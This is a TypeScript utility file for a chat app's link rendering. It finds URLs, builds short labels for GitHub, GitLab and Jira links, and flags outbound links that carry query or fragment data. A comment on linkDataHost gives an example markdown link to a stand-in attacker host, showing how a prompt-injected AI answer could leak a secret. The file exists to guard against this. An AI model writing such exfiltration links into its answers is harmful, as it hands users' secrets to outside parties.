import type { CSSProperties } from 'react';

/** Link look shared by the user query and the answer markdown. */
export const CHAT_LINK_STYLE: CSSProperties = {
  color: 'var(--accent-11)',
  textDecoration: 'underline',
  textDecorationColor: 'var(--accent-a8)',
  textUnderlineOffset: '0.2em',
};

const URL_PATTERN = /https?:\/\/[^\s<>"'`…]+/g;
const TRAILING_PUNCTUATION = /[.,;:!?'"\]}>]+$/;
const MAX_SEGMENT = 40;

export interface UrlSpan {
  start: number;
  end: number;
  url: string;
}

/**
 * Raw http(s) URLs in plain text. Trailing sentence punctuation is left out,
 * and a closing ")" only counts when the URL opened one (wiki-style links).
 */
export function findUrls(text: string): UrlSpan[] {
  const spans: UrlSpan[] = [];
  for (const match of text.matchAll(URL_PATTERN)) {
    let url = match[0];
    for (;;) {
      const trimmed = url.replace(TRAILING_PUNCTUATION, '');
      const unbalanced =
        trimmed.endsWith(')') && trimmed.split('(').length < trimmed.split(')').length;
      const next = unbalanced ? trimmed.slice(0, -1) : trimmed;
      if (next === url) break;
      url = next;
    }
    if (url.length > 'https://'.length) {
      spans.push({ start: match.index, end: match.index + url.length, url });
    }
  }
  return spans;
}

/** Where to cut `text` near `limit` without splitting a URL (the URL is kept whole). */
export function cutOutsideUrl(text: string, limit: number): number {
  const straddling = findUrls(text).find((s) => s.start < limit && s.end > limit);
  return straddling ? straddling.end : limit;
}

/** True when a link's visible text is just its own address, as with a pasted or autolinked URL. */
export function isRawUrlText(text: string, href: string): boolean {
  // GFM links a bare `www.` address as `http://www.…`; otherwise text and address must match exactly.
  const written = /^https?:\/\//i.test(text.trim()) ? text.trim() : `http://${text.trim()}`;
  const trim = (s: string) => s.replace(/\/$/, '');
  return text.trim() !== '' && trim(written) === trim(href);
}

function decode(segment: string): string {
  try {
    return decodeURIComponent(segment);
  } catch {
    return segment;
  }
}

function clip(segment: string): string {
  return segment.length > MAX_SEGMENT ? `${segment.slice(0, MAX_SEGMENT - 1)}…` : segment;
}

/**
 * Short, readable label for a raw URL, the way the host itself names it: a
 * GitHub pull request reads `#123`, a commit `ab12cd3`. Anything unrecognised becomes
 * `host/…/last-segment`; input that is not an http(s) URL is returned as is.
 */
export function shortLinkLabel(href: string): string {
  let url: URL;
  try {
    url = new URL(href);
  } catch {
    return href;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return href;

  const host = url.hostname.replace(/^www\./, '');
  const parts = url.pathname.split('/').filter(Boolean).map(decode);

  if (host === 'github.com' && parts.length >= 4) {
    const [, , kind, id] = parts;
    if ((kind === 'pull' || kind === 'issues' || kind === 'discussions') && /^\d+$/.test(id)) {
      return `#${id}`;
    }
    if (kind === 'commit' && /^[0-9a-f]{7,40}$/i.test(id)) return id.slice(0, 7);
  }

  // GitLab, hosted or self-managed: …/-/merge_requests/<n> or …/-/issues/<n>.
  const dash = parts.indexOf('-');
  if (dash > 0 && /^\d+$/.test(parts[dash + 2] ?? '')) {
    if (parts[dash + 1] === 'merge_requests') return `!${parts[dash + 2]}`;
    if (parts[dash + 1] === 'issues') return `#${parts[dash + 2]}`;
  }

  // Jira: …/browse/KEY-123
  const browse = parts.indexOf('browse');
  if (browse >= 0 && /^[A-Z][A-Z0-9_]+-\d+$/.test(parts[browse + 1] ?? '')) return parts[browse + 1];

  if (parts.length === 0) return host;
  if (parts.length === 1) return `${host}/${clip(parts[0])}`;
  return `${host}/…/${clip(parts[parts.length - 1])}`;
}

/**
 * The host a link would hand data to, when the link leaves this app and its
 * address carries a query string or fragment data; null otherwise. An injected
 * answer can write `[click](https://attacker.example/?d=<secret>)`, so such a
 * link is confirmed before it opens. Plain `#section` anchors and text-fragment
 * directives (`#:~:text=`, which the target page cannot read) are not data.
 */
export function linkDataHost(href: string, appOrigin: string): string | null {
  let url: URL;
  try {
    url = new URL(href, appOrigin);
  } catch {
    return null;
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return null;
  if (url.origin === appOrigin) return null;
  const fragment = url.hash.slice(1).split(':~:')[0];
  const fragmentData = fragment.length > 64 || /[=&?/]/.test(fragment);
  return url.search.length > 1 || fragmentData ? url.hostname : null;
}

/** The address without its query and fragment, for showing where a link goes. */
export function linkWithoutData(href: string): string {
  try {
    const url = new URL(href);
    return `${url.origin}${url.pathname}`;
  } catch {
    return href;
  }
}
